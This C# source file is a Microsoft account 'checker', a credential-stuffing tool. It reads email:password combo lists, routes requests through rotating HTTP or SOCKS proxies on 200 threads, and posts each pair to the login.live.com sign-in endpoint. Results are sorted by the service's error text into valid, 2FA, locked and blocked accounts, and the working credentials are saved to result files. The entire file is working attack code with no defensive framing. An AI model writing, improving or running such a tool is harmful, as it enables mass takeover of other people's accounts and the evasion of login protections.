using Leaf.xNet;
using System;
using System.Collections;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.IO;
using System.Net;
using System.Threading;
using System.Threading.Tasks;

namespace Lowest_Checker.Microsoft
{
    internal class Checker
    {
        public static int Microsoft_Vailed = 0;
        public static int Microsoft_Invailed = 0;
        public static int Microsoft_2FAs = 0;
        public static int Microsoft_Process = 0;
        public static int Microsoft_MinThreads = 200;
        public static int Microsoft_MaxThreads = 200;
        public static int Microsoft_ProxyTimeout = 8000;
        public static int Microsoft_Blocked = 0;
        public static int Microsoft_Unknown = 0;
        public static int Microsoft_Locked = 0;
        public static int Microsoft_ProxiyErrors = 0;
        public static bool Microsoft_Save2FAs = false;
        public static bool Microsoft_SaveBlocked = false;
        public static bool Microsoft_SaveLockeds = false;

        public static string Microsoft_Proxies_Type = "http";
        public static int Microsoft_UpdateProxiesTime = 120;
        public static ConcurrentQueue<string> combos = new ConcurrentQueue<string>(LoadCombos.Microsoft_Combos);
        public static ConcurrentQueue<string> proxies = new ConcurrentQueue<string>(LoadProxies.Microsoft_Proxies);
        private static string fileTime = null;
        private static readonly object fileLock = new object();

        public static Task  checker()
        {
            DateTime now = DateTime.Now;
            fileTime = now.ToString("yyyy-MM-dd_HH-mm-ss");
            ThreadPool.SetMaxThreads(Microsoft_MaxThreads, Microsoft_MaxThreads);
            ThreadPool.SetMinThreads(Microsoft_MinThreads, Microsoft_MinThreads);
            while (combos.TryDequeue(out string combo))
            {

                ThreadPool.QueueUserWorkItem(async state =>
                {

                    await login(combo);

                });
            }

            return Task.CompletedTask;
        }

        private static void saveAcc(string name, string combo)
        {
            string path = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Result", fileTime);
            string filePath = Path.Combine(path, name + ".txt");
            lock (fileLock)
            {
                if (!File.Exists(path))
                {
                    Directory.CreateDirectory(path);
                }
                using (StreamWriter writer = new StreamWriter(filePath, true))
                {
                    writer.WriteLine(combo);
                }
            }
        }
        public static async Task login(string combo)
        {
            string[] c = combo.Split(':');
            await Task.Run(() =>
            {
            try
            {
                HttpRequest hr = new HttpRequest();
                hr.AddHeader("Cookie", "uaid=997491099067491bba24d177d327c6bc;OParams=11O.Dtl3KFgTlSfW98LacS!ptMLwulhoPc2HfR4NMvLarvudOZqtDZNdzaXYrCUrgv0lvWE3gagajf4b**KYucBs6rcxbnFWVbUYP5MDqNZtZl2up*oaOH*r*dlBtUNk3wajNLdqPssy5qdXbz23KWmGRZmWMUpss61qKILWHU1PcK55CDMdREZkQLs5SKfrzmSi6GIK5pOCsUHF7jG109KqiysvdBX1QGKFuMetLGBnk7TqnvPDr1XNUctVq1LVZldwK1Kh14dZ4NW1TEGa2aWb1754teNeMFU0QHijekpWXz7PqN6VXZQpzIsdpKgnlm0gwSF6NA*BducBpOwNvtlK2x*IK9zHET6mKf6oMZ7RCge8hJIpS!zXYUQuJ6SN2sulQSYiGZY5NohsdzFtAHPnu3Y!V8mRW4JVs3LVUFYMtUy8il2l8vS6V38EU54FfxE46lR68NHTlRbwmqPzJSTmCRnqHa!z0ZZ2TIG9Rwvv7vSWdDjHalDUcadlJNkq8n4Nyd2AUhb3YS0vSw1rRtOEjyqaYjVNJv1Y2M80yRTn5S8m!B7W!MnU!5T*YUeGNberlWiUQDjXv*gm28DOOycNVgyt8EstYyCACwDtiqg5AUyaXHzE2Y1q1lxruLsm21HgtSs!THMrk9G744sL78WT7!xAOO8Hn4Hyy1ZHjJB6PNL5UtbHS2dTU2W8r*1S7aeL6XYbCeqztukq04sQI5kepFOQpLKSttd*Utr1V5iKV*Xtbf9*1q4L*q3P1d1OKHJsRnq4e!DZzKmcOyD7qvRQ5!*xukvz!0iSea8b*9mxrj2skBzj1h!6nSTOYosHnESPgboSmQibnluh25W8vMRfmlhsk*i7E3le5TxjF2JbqVnoaNrzi3i7DzCB2g3gD3ERs7yi*U2Ku2OIWATQCkNaTCWe0XGQH31ZvkpgTK2Pbm!wbAJlcBbc52DvdH9qNA4rWqxDZvz7K8eX0UbGPSa!yBSVT2eidRdVHmJKD2P5A5tpGZbr4pRcOnvdzdb7lhoKzE47ayariraCi!8aZ2fp7opO!c6OZJn4A2yY*tqrHj2SguZhS8eujnah4zCGUyGlEsotb8nz7IMI9PpSnT9pjIBLT!3ssMrwNIXJjBKe!QBWEnrDYJVWrD6dCG1MxBYRiQs49ENErei8WBPrSr9rguH6Iln6J7kTRk6EOHzRK4zx; MicrosoftApplicationsTelemetryDeviceId=9f48cbcf-2065-41a6-9ec6-cfea58e50fc7;MSPOK=$uuid-2251fabf-d00c-4cee-90af-dbaed532e53d$uuid-4bc14905-3158-40b0-8ec8-afd69f8db93b");
                if (proxies.TryDequeue(out string proxy) && proxy != null)
                {
                    bool proxyConfigured = false;
                    try
                    {
                        if (Microsoft_Proxies_Type.Contains("socks5"))
                        {
                            hr.Proxy = Socks5ProxyClient.Parse(proxy);
                        }
                        else if (Microsoft_Proxies_Type.Contains("socks4"))
                        {
                            hr.Proxy = Socks4ProxyClient.Parse(proxy);
                        }
                        else if (Microsoft_Proxies_Type.Contains("http"))
                        {
                            hr.Proxy = HttpProxyClient.Parse(proxy);
                        }
                        proxyConfigured = true;
                    }
                    catch (Exception)
                    {
                    }    
                    finally
                    {
                        if (proxyConfigured)
                        {
                            proxies.Enqueue(proxy);
                        }
}
                }



                    hr.ConnectTimeout = Microsoft_ProxyTimeout;
                    string date = "ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=-Dhi8VrEj*viQQ%21ai0rKc1aUkB3Q5Ibrg%21n8rBDXS1eCBeaLn9uYAKDrrwCkIgpj6Gjx7Jk2FFHjxrMHcf30iPWIJHSbri7tPv17D6t%21Tu%21zxL1abqNLF5*CvTDBHXt%21ucZffVpz2qyciFrnvraBSgcMqVGIhpP0mq3cMgLPdBhdjSAkGXW5fQufS4FMvAqf2OOA7tNaJQdNp7TBCWrG0sYE32qUTAWgRDs8aX6QSUUVkrYCIqLlj%21pa0v9edYIPvoA%24%24&PPSX=Passpor&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&isRecoveryAttemptPost=0&i13=0&login=" + c[0]+"&loginfmt="+c[0]+"&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=" + c[1];
                    HttpResponse resp = hr.Post("https://login.live.com/ppsecure/post.srf?cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c&id=292841&contextid=0F55AFE40B12B96A&opid=0C3CE1C453940454&bk=1717682072&uaid=997491099067491bba24d177d327c6bc&nw=4G&pid=0", date, "application/x-www-form-urlencoded");
                    int respCookies = resp.Cookies.Count;

                    string response = resp.ToString();
                    
                    if (response.Contains("You\\'ve tried to sign in too many times with an incorrect account or password."))
                    {

                        Microsoft_Blocked++;
                        Microsoft_Process++;
                        if (Microsoft_SaveBlocked)
                        {
                            saveAcc("Blocked", combo);
                        }

                    }
                    else if (respCookies >= 3 & response.Contains("Your account or password is incorrect. "))
                    {
                        Microsoft_Invailed++;
                        Microsoft_Process++;
                    }else if(response.Contains("That Microsoft account doesn\'t exist."))
                    {
                        Microsoft_Invailed++;
                        Microsoft_Process++;
                    }
                    else if(response.Contains("Please enter the password for your"))
                    {
                        Microsoft_Invailed++;
                        Microsoft_Process++;
                    }else if (!response.Contains("sErrTxt")& response.Contains("Microsoft account requires JavaScript to sign in. This web browser either does not support JavaScript"))
                    {
                        if (!response.Contains("PROOF.Type") && !response.Contains("\"><input type=\"hidden\" name=\"uaid\" id=\"uaid\" value=\""))
                        {
                            Microsoft_Vailed++;
                            Microsoft_Process++;
                            saveAcc("Vailed", combo);
                        }
                        else if (response.Contains("PROOF.Type"))
                        {
                            Microsoft_2FAs++;
                            Microsoft_Process++;
                            if (Microsoft_Save2FAs)
                            {
                                saveAcc("2FAs", combo);
                            }
                        }
                        else
                        {
                            Microsoft_Locked++;
                            Microsoft_Process++;
                            if (Microsoft_SaveLockeds)
                            {
                                saveAcc("Lockeds", combo);
                            }
                        }
                    }
                    else
                    {
                        Microsoft_Unknown++;
                        Microsoft_Process++;
                        saveAcc("Unknown", combo+"-------Used Proxy:" + proxy);
                    }
                }
                catch (Exception ex)
                {
                    Microsoft_ProxiyErrors++;
                    combos.Enqueue(combo);
                }
            });
            
         }
               
     }
}

